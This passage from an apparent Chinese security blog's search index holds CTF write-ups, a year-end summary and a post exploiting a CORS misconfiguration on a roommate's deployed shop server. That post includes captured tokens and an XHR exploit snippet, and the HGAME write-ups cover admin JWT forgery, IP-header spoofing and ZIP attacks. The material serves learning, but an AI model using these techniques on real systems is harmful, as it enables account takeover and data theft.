= num+<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> (<span class=\"string\">&quot;[+]The result of decoding is: %s&quot;</span> % src)</span><br><span class=\"line\">        <span class=\"built_in\">print</span> (<span class=\"string\">&quot;[+]The number of decoding is: %d&quot;</span> % num)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    strs=<span class=\"string\">&quot;&quot;</span> //输入待解密的base64</span><br><span class=\"line\">    base64decoding(strs)</span><br></pre></td></tr></table></figure>","categories":["ctf比赛"],"tags":["catf1ag平台"]},{"title":"跨域资源共享CORS漏洞","url":"/2022/05/06/%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%ABCORS%E6%BC%8F%E6%B4%9E/","content":"<p>跨域资源共享CORS漏洞</p>\n<span id=\"more\"></span>\n\n<h3 id=\"跨域资源共享CORS漏洞\"><a href=\"#跨域资源共享CORS漏洞\" class=\"headerlink\" title=\"跨域资源共享CORS漏洞\"></a>跨域资源共享CORS漏洞</h3><h6 id=\"经过：我舍友搭建了一个商店平台，并部署在了服务器上，闲来无事，想测一下有无漏洞，用bs一扫发现\"><a href=\"#经过：我舍友搭建了一个商店平台，并部署在了服务器上，闲来无事，想测一下有无漏洞，用bs一扫发现\" class=\"headerlink\" title=\"经过：我舍友搭建了一个商店平台，并部署在了服务器上，闲来无事，想测一下有无漏洞，用bs一扫发现\"></a>经过：我舍友搭建了一个商店平台，并部署在了服务器上，闲来无事，想测一下有无漏洞，用bs一扫发现</h6><h6 id=\"Issue-Cross-origin-resource-sharing-arbitrary-origin-trusted\"><a href=\"#Issue-Cross-origin-resource-sharing-arbitrary-origin-trusted\" class=\"headerlink\" title=\"Issue:  Cross-origin resource sharing: arbitrary origin trusted\"></a>Issue:  Cross-origin resource sharing: arbitrary origin trusted</h6><h6 id=\"Severity-High\"><a href=\"#Severity-High\" class=\"headerlink\" title=\"Severity:  High\"></a>Severity:  High</h6><h6 id=\"Confidence-Certain\"><a href=\"#Confidence-Certain\" class=\"headerlink\" title=\"Confidence:  Certain\"></a>Confidence:  Certain</h6><p>于是想要利用一下，看是否能不能成功。</p>\n<h4 id=\"漏洞鉴别\"><a href=\"#漏洞鉴别\" class=\"headerlink\" title=\"漏洞鉴别\"></a>漏洞鉴别</h4><h6 id=\"修改请求包-Header-中的-Origin-字段为任意域名或者为-null-的方式去检测该漏洞是否存在。若应用程序接受来自任何-Origin-的-CORS-请求。该代码将-Origin-值放在-HTTP-响应头-Access-Control-Allow-Origin-中。现在，此配置将允许来自任何-Origin-的任何脚本向应用程序发出-CORS-请求。Web-浏览器将执行标准的-CORS-请求检查，来自恶意域的脚本将能够窃取数据。\"><a href=\"#修改请求包-Header-中的-Origin-字段为任意域名或者为-null-的方式去检测该漏洞是否存在。若应用程序接受来自任何-Origin-的-CORS-请求。该代码将-Origin-值放在-HTTP-响应头-Access-Control-Allow-Origin-中。现在，此配置将允许来自任何-Origin-的任何脚本向应用程序发出-CORS-请求。Web-浏览器将执行标准的-CORS-请求检查，来自恶意域的脚本将能够窃取数据。\" class=\"headerlink\" title=\"修改请求包 Header 中的 Origin 字段为任意域名或者为 null 的方式去检测该漏洞是否存在。若应用程序接受来自任何 Origin 的 CORS 请求。该代码将 Origin 值放在 HTTP 响应头 Access-Control-Allow-Origin 中。现在，此配置将允许来自任何 Origin 的任何脚本向应用程序发出 CORS 请求。Web 浏览器将执行标准的 CORS 请求检查，来自恶意域的脚本将能够窃取数据。\"></a>修改请求包 Header 中的 Origin 字段为任意域名或者为 null 的方式去检测该漏洞是否存在。若应用程序接受来自任何 Origin 的 CORS 请求。该代码将 Origin 值放在 HTTP 响应头 Access-Control-Allow-Origin 中。现在，此配置将允许来自任何 Origin 的任何脚本向应用程序发出 CORS 请求。Web 浏览器将执行标准的 CORS 请求检查，来自恶意域的脚本将能够窃取数据。</h6><h5 id=\"应用程序接受-Origin-标头中指定的任何值。\"><a href=\"#应用程序接受-Origin-标头中指定的任何值。\" class=\"headerlink\" title=\"应用程序接受 Origin 标头中指定的任何值。\"></a>应用程序接受 Origin 标头中指定的任何值。</h5><h4 id=\"利用方式：\"><a href=\"#利用方式：\" class=\"headerlink\" title=\"利用方式：\"></a>利用方式：</h4><h5 id=\"1-用bs抓登陆的包，返回-“code”-200-”message”-”鎴愬姛”-”data”-“nickName”-”1586937092148”-”name”-”1586937092148”-”userId”-49-”token”-”c0803c8d04bb406f843cdac49c6eb178”-”ok”-true\"><a href=\"#1-用bs抓登陆的包，返回-“code”-200-”message”-”鎴愬姛”-”data”-“nickName”-”1586937092148”-”name”-”1586937092148”-”userId”-49-”token”-”c0803c8d04bb406f843cdac49c6eb178”-”ok”-true\" class=\"headerlink\" title=\"1.用bs抓登陆的包，返回{“code”:200,”message”:”鎴愬姛”,”data”:{“nickName”:”1586937092148”,”name”:”1586937092148”,”userId”:49,”token”:”c0803c8d04bb406f843cdac49c6eb178”},”ok”:true}\"></a>1.用bs抓登陆的包，返回{“code”:200,”message”:”鎴愬姛”,”data”:{“nickName”:”1586937092148”,”name”:”1586937092148”,”userId”:49,”token”:”c0803c8d04bb406f843cdac49c6eb178”},”ok”:true}</h5><p>头部添加Origin: <a href=\"http://www.php8.com/\">http://www.php8.com/</a> 响应</p>\n<p>Access-Control-Allow-Origin: <a href=\"http://www.php8.com/\">http://www.php8.com/</a><br>Access-Control-Allow-Credentials: true</p>\n<p>这个注入点需要账号密码正确才返回token的值，并且我在利用的时候出现https不能含有http，而我又没有http域名，要访问的网址也不能用https访问，只能用http访问，我感觉如果有http域名，是可以获得token的。</p>\n<h5 id=\"2-用bs抓用户信息的包，发现其需要token-ba0538a55e804b768ae2655586f8b813，而第一步获得不了token，这一步也不能利用。\"><a href=\"#2-用bs抓用户信息的包，发现其需要token-ba0538a55e804b768ae2655586f8b813，而第一步获得不了token，这一步也不能利用。\" class=\"headerlink\" title=\"2.用bs抓用户信息的包，发现其需要token: ba0538a55e804b768ae2655586f8b813，而第一步获得不了token，这一步也不能利用。\"></a>2.用bs抓用户信息的包，发现其需要token: ba0538a55e804b768ae2655586f8b813，而第一步获得不了token，这一步也不能利用。</h5><h5 id=\"3-用bs抓注册的包，发现获取验证码是可以利用的，代码如下，但是是在本地\"><a href=\"#3-用bs抓注册的包，发现获取验证码是可以利用的，代码如下，但是是在本地\" class=\"headerlink\" title=\"3.用bs抓注册的包，发现获取验证码是可以利用的，代码如下，但是是在本地\"></a>3.用bs抓注册的包，发现获取验证码是可以利用的，代码如下，但是是在本地</h5><p>修改<a href=\"https://github.com/incredibleindishell/CORS-vulnerable-Lab%E4%B8%AD%E7%9A%84arbitrary_origin_exploit%E5%86%85%E5%AE%B9%E5%A6%82%E4%B8%8B%EF%BC%9A\">https://github.com/incredibleindishell/CORS-vulnerable-Lab中的arbitrary_origin_exploit内容如下：</a></p>\n<p>xhttp.open(“get”, “http://********/api/user/passport/sendCode/123”, true); //change the URL to the one which has mis-configured CORS policy<br> xhttp.setRequestHeader(“userTempId”, “0b5c72e4-eae9-423d-88ae-ed8df5c36683”);</p>\n<p>在网址上访问就可获得验证码。</p>\n<p>推荐学习网址：<a href=\"https://blog.csdn.net/weixin_43571641/article/details/119847981\">(3条消息) 跨域资源共享CORS漏洞_Luckysec的博客-CSDN博客_cors跨域资源共享漏洞</a></p>\n<h4 id=\"口地址用的是http协议，而页面是https，我们都知道，https页面请求接口，接口都会强制转换成https的，在火狐浏览器中，当接口进行了一次转换时，请求的-origin就丢失了-待解决-，解决办法最好用是http服务的来弄。\"><a href=\"#口地址用的是http协议，而页面是https，我们都知道，https页面请求接口，接口都会强制转换成https的，在火狐浏览器中，当接口进行了一次转换时，请求的-origin就丢失了-待解决-，解决办法最好用是http服务的来弄。\" class=\"headerlink\" title=\"口地址用的是http协议，而页面是https，我们都知道，https页面请求接口，接口都会强制转换成https的，在火狐浏览器中，当接口进行了一次转换时，请求的 origin就丢失了.(待解决)，解决办法最好用是http服务的来弄。\"></a>口地址用的是http协议，而页面是https，我们都知道，https页面请求接口，接口都会强制转换成https的，在火狐浏览器中，当接口进行了一次转换时，请求的 origin就丢失了.(待解决)，解决办法最好用是http服务的来弄。</h4>","categories":["漏洞复现"],"tags":["跨域资源共享CORS漏洞"]},{"title":"长安战役网络安全卫士守护赛","url":"/2022/01/16/%E9%95%BF%E5%AE%89%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/","content":"<h4 id=\"本次长安战役网络安全卫士赛，我一共做出来4道题，总排名201名，一共有408份有效成绩，取前50-获得证书，201名差点就得不到证书了，好险。\"><a href=\"#本次长安战役网络安全卫士赛，我一共做出来4道题，总排名201名，一共有408份有效成绩，取前50-获得证书，201名差点就得不到证书了，好险。\" class=\"headerlink\" title=\"本次长安战役网络安全卫士赛，我一共做出来4道题，总排名201名，一共有408份有效成绩，取前50%获得证书，201名差点就得不到证书了，好险。\"></a>本次长安战役网络安全卫士赛，我一共做出来4道题，总排名201名，一共有408份有效成绩，取前50%获得证书，201名差点就得不到证书了，好险。</h4><span id=\"more\"></span>\n\n<h5 id=\"下面是4道题的wp：\"><a href=\"#下面是4道题的wp：\" class=\"headerlink\" title=\"下面是4道题的wp：\"></a>下面是4道题的wp：</h5><h6 id=\"1-misc签到题\"><a href=\"#1-misc签到题\" class=\"headerlink\" title=\"1.misc签到题\"></a>1.misc签到题</h6><p>按照要求走出迷宫，可得到“战长恙长战恙河长山山安战役役战役安役长安恙”，将其转为拼音，得到<br>cazy{zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang}</p>\n<p>做这道题的时候太傻了，没看到图片上的‘cazy{’和‘}’，导致签到题卡了很久，太离谱了。</p>\n<h6 id=\"2-逆向Combat-slogan\"><a href=\"#2-逆向Combat-slogan\" class=\"headerlink\" title=\"2.逆向Combat_slogan\"></a>2.逆向Combat_slogan</h6><p>1.点开是jar文件，jd-gui反编译成java代码，发现两处比较,Jr_j11y_s1tug_g0_raq_g0_raq_pnml 这个比较比较困难，那就换一个比较。2.871019511949491089510249103104116951164895101110100951164895101110100959997122121 发现这个是将输入转化为10进制拼接起来，那就根据ascii的常规大小分割这一长的字符串。</p>\n<p>3.可以得到</p>\n<p><img src=\"/2022/01/16/%E9%95%BF%E5%AE%89%E6%88%98%E5%BD%B9%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/image-20220116150049089.png\" alt=\"image-20220116150049089\"></p>\n<p>可以得到flag{We_w11l_f1ght_t0_end_cazy}</p>\n<p>我做的这道题的方法应该是简单的方法，赛后看别人的wp都是用第一种比较方法得出。</p>\n<h6 id=\"3逆向Cuted-dogs\"><a href=\"#3逆向Cuted-dogs\" class=\"headerlink\" title=\"3逆向Cuted_dogs\"></a>3逆向Cuted_dogs</h6><p>1.IDA64打开，查找字符串，找到ZmxhZ3tDaDFuYV95eWRzX2Nhenl9</p>\n<p>2.觉得很可能是base64，所以base64解码可得flag{Ch1na_yyds_cazy}</p>\n<p>这种题太简单了。</p>\n<h6 id=\"4-逆向Hello-py\"><a href=\"#4-逆向Hello-py\" class=\"headerlink\" title=\"4.逆向Hello py\"></a>4.逆向Hello py</h6><p>1.使用uncompyle6将pyc反编译成py</p>\n<p>2.打开py文件，发现能直接运行，同时关注加密代码，发现动态分析更容易得到flag。</p>\n<p>3.pycharm动态调试，输入0000000000，在flag==Happy下断点，可以得到flag=[1, 49, 3, 51, 5, 53, 7, 55, 9, 57]，</p>\n<p>使用代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">Happy = [<span class=\"number\">44</span>, <span class=\"number\">100</span>, <span class=\"number\">3</span>, <span class=\"number\">50</span>, <span class=\"number\">106</span>, <span class=\"number\">90</span>, <span class=\"number\">5</span>, <span class=\"number\">102</span>, <span class=\"number\">10</span>, <span class=\"number\">112</span>]</span><br><span class=\"line\">flag=[]</span><br><span class=\"line\">flag1=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">mm=[<span class=\"number\">1</span>, <span class=\"number\">49</span>, <span class=\"number\">3</span>, <span class=\"number\">51</span>, <span class=\"number\">5</span>, <span class=\"number\">53</span>, <span class=\"number\">7</span>, <span class=\"number\">55</span>, <span class=\"number\">9</span>, <span class=\"number\">57</span>]<span class=\"comment\">#内容是输入0000000000后，flag中的内容。</span></span><br><span class=\"line\">input1 = <span class=\"string\">&quot;0000000000&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(mm)):</span><br><span class=\"line\">    flag.append(<span class=\"built_in\">chr</span>(mm[i]^<span class=\"built_in\">ord</span>(input1[i])^Happy[i]))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(flag)):</span><br><span class=\"line\">    flag1+=flag[i]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag1)</span><br></pre></td></tr></table></figure>\n\n<p>可以得到，\u001de01__2a3y，发现偶数位的字符应该是正确的，但奇数位是错误的。</p>\n<p>将\u001de01__2a3y作为输入，重复以上操作，可以得到flag=[121, 100, 2, 50, 5, 90, 84, 102, 67, 112]，运行代码。</p>\n<p>可以得到flag{He110_cazy}，最终的py代码。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">Happy = [<span class=\"number\">44</span>, <span class=\"number\">100</span>, <span class=\"number\">3</span>, <span class=\"number\">50</span>, <span class=\"number\">106</span>, <span class=\"number\">90</span>, <span class=\"number\">5</span>, <span class=\"number\">102</span>, <span class=\"number\">10</span>, <span class=\"number\">112</span>]</span><br><span class=\"line\">flag=[]</span><br><span class=\"line\">flag1=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">mm=[<span class=\"number\">121</span>, <span class=\"number\">100</span>, <span class=\"number\">2</span>, <span class=\"number\">50</span>, <span class=\"number\">5</span>, <span class=\"number\">90</span>, <span class=\"number\">84</span>, <span class=\"number\">102</span>, <span class=\"number\">67</span>, <span class=\"number\">112</span>]</span><br><span class=\"line\">input1 = <span class=\"string\">&quot;\u001de01__2a3y&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(mm)):</span><br><span class=\"line\">    flag.append(<span class=\"built_in\">chr</span>(mm[i]^<span class=\"built_in\">ord</span>(input1[i])^Happy[i]))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(flag)):</span><br><span class=\"line\">    flag1+=flag[i]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag1)</span><br><span class=\"line\"><span class=\"comment\">#He110_cazy</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n\n\n","categories":["ctf比赛"],"tags":["自己搭建博客写的第一篇文章"]},{"title":"年终总结","url":"/2022/02/04/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/","content":"<h6 id=\"发现很多博客都有年终报告，自己想了想的确很有必要，那就写一写自己一年以来的历程。\"><a href=\"#发现很多博客都有年终报告，自己想了想的确很有必要，那就写一写自己一年以来的历程。\" class=\"headerlink\" title=\"发现很多博客都有年终报告，自己想了想的确很有必要，那就写一写自己一年以来的历程。\"></a>发现很多博客都有年终报告，自己想了想的确很有必要，那就写一写自己一年以来的历程。</h6><span id=\"more\"></span>\n\n<p>大二上学期开始，自己开始报名打ctf比赛，想着学习一下，然后就参加了山东省举办的各种ctf比赛，还有去郑州比的一次赛。感觉到自己好菜，感谢我学校师哥们带我打比赛，让自己从什么不会，变得会了一些东西。自己也能做出一些简单题，从菜变得不是那么菜，参加比赛也获得了一些奖。现在也是打一些线上ctf比赛来提高自己的技术。自己也在这个寒假把博客搭建起来了，希望我能把这个博客好好利用下去，多记录一些知识和比赛wp。</p>\n<p>下一年希望自己有机会参加更多的比赛，不管是线上赛还是线下赛，来提升自己。因为自己现在是主打逆向，而我学的网络安全，希望自己在下一年里能多学一些有关web安全的只是，多做一些web类型的题目。自己还要坚持写博客。</p>\n<p>奥对，还有好好学习天天向上。</p>\n","categories":["个人总结"],"tags":["自己一年的总结以及对下一年的期望"]},{"title":"HGAME2022复现","url":"/2022/02/20/HGAME2022%E5%A4%8D%E7%8E%B0/","content":"<h3 id=\"这一篇文章是自己没有解出来看了别人的wp复现的文章，自己解决的在上一篇文章。\"><a href=\"#这一篇文章是自己没有解出来看了别人的wp复现的文章，自己解决的在上一篇文章。\" class=\"headerlink\" title=\"这一篇文章是自己没有解出来看了别人的wp复现的文章，自己解决的在上一篇文章。\"></a>这一篇文章是自己没有解出来看了别人的wp复现的文章，自己解决的在上一篇文章。</h3><span id=\"more\"></span>\n\n<h4 id=\"Level-Week1\"><a href=\"#Level-Week1\" class=\"headerlink\" title=\"Level - Week1\"></a>Level - Week1</h4><h5 id=\"misc\"><a href=\"#misc\" class=\"headerlink\" title=\"misc\"></a>misc</h5><h6 id=\"好康的流量\"><a href=\"#好康的流量\" class=\"headerlink\" title=\"好康的流量\"></a>好康的流量</h6><p>这一题我只解决了后半部分flag，前半部分flag没有找到。</p>\n<p>1.通过流量将数据转为图片。</p>\n<p>2.使用stegsolve打开图片，找到green plane2，可以得到一个条形码，就得到了前半部分flag</p>\n<p>3.使用lsb隐写可以得到后半部分flag</p>\n<p><img src=\"/2022/02/20/HGAME2022%E5%A4%8D%E7%8E%B0/image-20220203214641804.png\" alt=\"image-20220203214641804\"></p>\n<p>两个部分组合，可以得到</p>\n<p>hgame{ez_1mg_Steg4n0g}</p>\n<h6 id=\"这个压缩包有点麻烦\"><a href=\"#这个压缩包有点麻烦\" class=\"headerlink\" title=\"这个压缩包有点麻烦\"></a>这个压缩包有点麻烦</h6><p>1.第一步直接明文全数字解密。</p>\n<p>2.第二步将文本文档当作字典解密。</p>\n<p>3.解压后里面又是个压缩包，和一个README，再打开压缩包看一下下一层压缩包里有一个flag.jpg和一个README，然后发现已经解压出来的README和最后一层压缩包里未解压的README的crc32一样，都是966ac0e8，那就是明文攻击了。根据README，将用存储的方式压缩，得到.zip文件。</p>\n<p>4.选择明文攻击，明文文件路径选择压缩的.zip文件，直接明文攻击，最终可以得到加密密钥，也就成功解压出来图片。</p>\n<p>5.使用formost分离图片，可以得到zip文件。</p>\n<p>知识点：压缩源文件数据区：50 4B 03 04：这是头文件标记</p>\n<p>压缩源文件目录区：</p>\n<p>50 4B 01 02：目录中文件文件头标记</p>\n<p>3F 00：压缩使用的 pkware 版本 </p>\n<p>14 00：解压文件所需 pkware 版本 </p>\n<p>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</p>\n<p>压缩源文件目录结束标志 ：50 4B 05 06：目录结束标记 </p>\n<p>所以直接用WinRAR修复一下，可以直接得到图片(简单方法)</p>\n<p>最终得到hgame{W0w!_y0U_Kn0w_z1p_3ncrYpt!}</p>\n<p>这道题让我学会了暴力破解，字典破解，明文破解，伪加密破解这么方法，出题人太强了！</p>\n<h5 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h5><h6 id=\"Fujiwara-Tofu-Shop\"><a href=\"#Fujiwara-Tofu-Shop\" class=\"headerlink\" title=\"Fujiwara Tofu Shop\"></a>Fujiwara Tofu Shop</h6><p>这道题我解决了前大半部，只剩一点不会解了。</p>\n<p>直接添加</p>\n<p>GET / HTTP/1.1<br>Host: shop.summ3r.top<br>User-Agent: Hachi-Roku<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>referer:qiumingshan.net<br>Cookie: flavor=Raspberry;<br>gasoline:100<br>x-real-ip:127.0.0.1<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0</p>\n<p>就这个不会添加x-real-ip:127.0.0.1</p>\n<p>这个好像X-Forwarded-For没有用，要将其替换为x-real-ip才行。学到了</p>\n<h6 id=\"easy-auth\"><a href=\"#easy-auth\" class=\"headerlink\" title=\"easy_auth\"></a>easy_auth</h6><p>1.首先注册登陆自己的账号，从应用程序的本地存储中获得自己的token，使用jwt解析工具进行解析，发现验证失败，当清空secret后发现验证成功。</p>\n<p>2.修改jwt中id和username为1和admin。</p>\n<p>3.将得到的token替换掉原来的token，刷新可以得到flag</p>\n<p>hgame{S0_y0u_K1n0w_hOw_<del>JwT_Works</del>1l1lL}</p>\n<p>jwt工具：<a href=\"https://jwt.io/\">JSON Web Tokens - jwt.io</a></p>\n<h5 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h5><h6 id=\"Dancing-Line\"><a href=\"#Dancing-Line\" class=\"headerlink\" title=\"Dancing Line\"></a>Dancing Line</h6><p>此程序来源于网络</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#向X轴方向移动一个像素点记为0，向Y轴方向移动一个像素点记为1</span></span><br><span class=\"line\">img = Image.<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;Dancing Line.bmp&#x27;</span>)</span><br><span class=\"line\">width, heigh = img.size</span><br><span class=\"line\"><span class=\"built_in\">print</span>(width,heigh)</span><br><span class=\"line\">binn_data = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">num_list = []</span><br><span class=\"line\">n=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"comment\">#将不是白色色块的n添加到num_list数组中</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> w <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(width):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(heigh):</span><br><span class=\"line\">        pix = img.getpixel((w,h))<span class=\"comment\">#竖着读取色块 主义w,h的关系</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> pix != (<span class=\"number\">255</span>,<span class=\"number\">255</span>,<span class=\"number\">255</span>): <span class=\"comment\">#白色色块</span></span><br><span class=\"line\">            num_list.append(n)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;&#123;&#125; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(pix, n))</span><br><span class=\"line\">        n+=<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(num_list)-<span class=\"number\">1</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(num_list[i+<span class=\"number\">1</span>]-num_list[i]&gt;=heigh):  <span class=\"comment\">#向右加0反之加1</span></span><br><span class=\"line\">        binn_data+=<span class=\"string\">&#x27;0&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        binn_data+=<span class=\"string\">&#x27;1&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+]binary data:&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(binn_data))</span><br><span class=\"line\">flag=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(binn_data),<span class=\"number\">8</span>):</span><br><span class=\"line\">    flag+=<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(binn_data[i:i+<span class=\"number\">8</span>],<span class=\"number\">2</span>))<span class=\"comment\">#2代表以2进制读入数字，每8位一组</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n\n<p>hgame{Danc1ng_L1ne_15_fun,_15n’t_1t?}</p>\n<h6 id=\"Matryoshka\"><a href=\"#Matryoshka\" class=\"headerlink\" title=\"Matryoshka\"></a>Matryoshka</h6><p>这道题想到是摩斯密码，但是不知道倒序</p>\n<p>将⠨换为. ，⠤换为- ，⠌换为/  倒序字符串，摩斯密码解密，可得</p>\n<p>46,66,42,75,66,45,46,6E,6D,4C,73,36,44,33,73,69,59,74,4C,36,58,32,70,34,69,4E,30,63,64,53,6C,79,6B,6D,39,72,51,4E,39,6F,4D,53,31,6A,6B,73,39,72,4B,32,52,36,6B,4C,38,68,6F,72,30,3D</p>\n<p>转为16进制</p>\n<p>FfBufEFnmLs6D3siYtL6X2p4iN0cdSlykm9rQN9oMS1jks9rK2R6kL8hor0=</p>\n<p>维多利亚解码，密钥hgame</p>\n<p>YzBibXZnaHl6X3swUmF6X2d4eG0wdGhrem9fMG9iMG1fdm9rY2N6dF8hcn0=</p>\n<p>base64：</p>\n<p>c0bmvghyz_{0Raz_gxxm0thkzo_0ob0m_vokcczt_!r}</p>\n<p>栅栏密码（每组22）：</p>\n<p>cbvhz{Rzgx0hz_o0_ocz_r0mgy_0a_xmtko0bmvkct!}</p>\n<p>凯撒密码 21：</p>\n<p>hgame{Welc0me_t0_the_w0rld_0f_crypt0graphy!}</p>\n<h5 id=\"Re\"><a href=\"#Re\" class=\"headerlink\" title=\"Re\"></a>Re</h5><h6 id=\"猫头鹰是不是猫\"><a href=\"#猫头鹰是不是猫\" class=\"headerlink\" title=\"猫头鹰是不是猫\"></a>猫头鹰是不是猫</h6><p>识别出这就是一个矩阵乘法（线性代数）,改变数据类型后方便观察。（好难）</p>\n<h5 id=\"Level-Week2\"><a href=\"#Level-Week2\" class=\"headerlink\" title=\"Level - Week2\"></a>Level - Week2</h5><h6 id=\"fake-shell\"><a href=\"#fake-shell\" class=\"headerlink\" title=\"fake shell\"></a>fake shell</h6><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">rc4_main</span>(<span class=\"params\">key=<span class=\"string\">&quot;init_key&quot;</span>, message=<span class=\"string\">&quot;init_message&quot;</span></span>):</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;RC4解密主函数调用成功&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">    s_box = rc4_init_sbox(key)</span><br><span class=\"line\">    crypt = rc4_excrypt(message, s_box)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> crypt</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">rc4_init_sbox</span>(<span class=\"params\">key</span>):</span></span><br><span class=\"line\">    s_box = <span class=\"built_in\">list</span>(<span class=\"built_in\">range</span>(<span class=\"number\">256</span>))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;原来的 s 盒：%s&quot;</span> % s_box)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">    j = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">256</span>):</span><br><span class=\"line\">        j = (j + s_box[i] + <span class=\"built_in\">ord</span>(key[i % <span class=\"built_in\">len</span>(key)])) % <span class=\"number\">256</span></span><br><span class=\"line\">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;混乱后的 s 盒：%s&quot;</span> % s_box)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s_box</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">rc4_excrypt</span>(<span class=\"params\">plain, box</span>):</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;调用解密程序成功。&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">    plain = base64.b64decode(plain.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">    plain = <span class=\"built_in\">bytes</span>.decode(plain)</span><br><span class=\"line\">    res = []</span><br><span class=\"line\">    i = j = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> plain:</span><br><span class=\"line\">        i = (i + <span class=\"number\">1</span>) % <span class=\"number\">256</span></span><br><span class=\"line\">        j = (j + box[i]) % <span class=\"number\">256</span></span><br><span class=\"line\">        box[i], box[j] = box[j], box[i]</span><br><span 